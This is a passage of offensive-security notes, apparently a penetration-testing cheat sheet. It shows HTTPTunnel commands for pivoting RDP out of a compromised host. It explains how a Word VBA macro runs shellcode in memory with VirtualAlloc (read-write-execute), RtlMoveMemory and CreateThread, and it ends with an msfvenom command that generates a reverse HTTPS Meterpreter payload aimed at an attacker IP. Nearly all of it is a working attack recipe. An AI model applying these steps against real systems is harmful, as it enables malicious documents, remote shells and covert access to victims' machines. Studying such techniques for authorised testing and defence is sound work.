ssh -L 0.0.0.0:8888:192.168.1.100:3389
```
2. Setup HTTPTunnel server on compromised machine (hts)
```
hts --foward-port localhost:8888 4444
```
3. Setup HTTPTunnel client on attacker machine
```
htc --forward-port 8080 10.10.10.10:4444
```
4. Connect with a RDP tool to 127.0.0.1:8080 (attacker machine)

# Executing Shellcode in Word Memory
To execute shellcode in memory we will take use of the three Win32 API's

##[VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)

Used to allocate memory. (https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)

```
LPVOID VirtualAlloc(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);
```
|Variable [Data Type]|Description|
|--------------------|-----------|
|lpAddress [LongPtr]| memory allocation address (set to 0, API will choose location)|
|dwSize [int]| size of allocation|
|flAllocationType [int]| allocation type (e.g. 0x3000 => [MEM_COMMIT and MEM_RESERVE](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex), in VBA: &H3000)|
|flProtect [int]| memory attribute (0x40 means the memory is readable, writable and executable, in VBA: &H40) |
|return value [LongPtr]| memory pointer|


* Integers can be translated to ``Long``
* dwSize can be hardcoded or set dynamically using ``UBound``: ``UBound(buf)``. [Link](https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/ubound-function), also see ``LBound`` [Link](https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/lbound-function)

**RtlMoveMemory**
After allocating memory we must copy our desired shellcode bytes into this memory location (executable buffer). This is done using ``RtlMoveMemory``. 

```
VOID RtlMoveMemory(
  VOID UNALIGNED *Destination,
  VOID UNALIGNED *Source,
  SIZE_T         Length
);
```

destination pointer [LongPtr]: memory pointer, points to newly allocated buffer
source buffer [Any]:address of an element from the shellcode (passed by reference)
length [Long]: length of shellcode to be copied (passed by value)
return value [LongPtr]: memory pointer

**CreateThread**
After copying the shelcode into the executable buffer, we can execute it with ``CreateThread``. [Link](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)

```
HANDLE CreateThread(
  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  SIZE_T                  dwStackSize,
  LPTHREAD_START_ROUTINE  lpStartAddress,
  LPVOID                  lpParameter,
  DWORD                   dwCreationFlags,
  LPDWORD                 lpThreadId
);
```


## Generate Shellcode
```
msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f vbapplication
```













